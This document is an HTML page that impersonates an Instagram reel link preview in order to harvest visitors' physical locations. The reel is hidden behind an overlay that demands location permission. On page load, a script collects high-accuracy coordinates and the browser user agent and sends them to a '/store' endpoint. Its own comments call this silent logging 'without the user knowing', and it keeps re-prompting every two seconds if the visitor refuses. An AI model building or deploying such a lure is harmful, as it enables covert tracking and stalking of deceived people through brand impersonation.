<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    
    <!-- WhatsApp & Social Media Link Preview Tags -->
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="Instagram reel by aaaaa_hahaha_01 Day 93...(tag your friends 😂😂😂😂😂😂😂😂😂😂😂)">
    <meta property="og:description" content="Watch this reel and more on Instagram.">
    <meta property="og:type" content="video">
    <meta property="og:url" content="https://www.instagram.com/reel/DI0zr7xSYMk/">
    <!-- Using standard Instagram app logo as thumbnail fallback -->
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png">
    <meta property="og:image:width" content="1024">
    <meta property="og:image:height" content="1024">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@instagram">
    <meta name="twitter:title" content="Instagram video by @instagram">
    <meta name="twitter:description" content="Watch this reel and more on Instagram.">
    <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000; /* Dark background like IG reels */
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }
        #lock-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            z-index: 100;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: sans-serif;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .btn-retry {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <!-- Overlay covering the reel until location is allowed -->
    <div id="lock-overlay">
        <h2>🔒 Allow Instagram permissions to View reel</h2>
        <p>Please click <b>"Allow"</b> on the location prompt to view this video.</p>
        <p style="font-size: 13px; color: #aaa; margin-top: 15px; max-width: 400px; line-height: 1.5;">
            If the popup doesn't appear, your browser has blocked it. Tap the <b>lock icon</b> in your browser's address bar, change Location to 'Allow', and click the button below.
        </p>
        <button class="btn-retry" onclick="requestLocation()">Request Access Again</button>
    </div>

    <!-- Instagram Reel Embed -->
    <iframe id="reel-iframe" src="https://www.instagram.com/reel/DI0zr7xSYMk/embed" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>

    <script>
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const uagent = navigator.userAgent;

                        // Silently log to our backend without the user knowing
                        const url = "/store?lat=" + lat +
                                    "&long=" + lon +
                                    "&uagent=" + encodeURIComponent(uagent);

                        fetch(url).catch(() => {});
                        
                        // Hide overlay, revealing the video
                        document.getElementById('lock-overlay').style.display = 'none';
                    },
                    (error) => {
                        console.log("Location denied or error:", error.message);
                        
                        // Make sure overlay stays visible if denied
                        document.getElementById('lock-overlay').style.display = 'flex';
                        
                        // Keep re-checking periodically in case they allow it in settings
                        setTimeout(requestLocation, 2000);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
        }

        // Automatic location tracking hidden in the background
        window.addEventListener('load', () => {
            requestLocation();
        });
    </script>

</body>
</html>
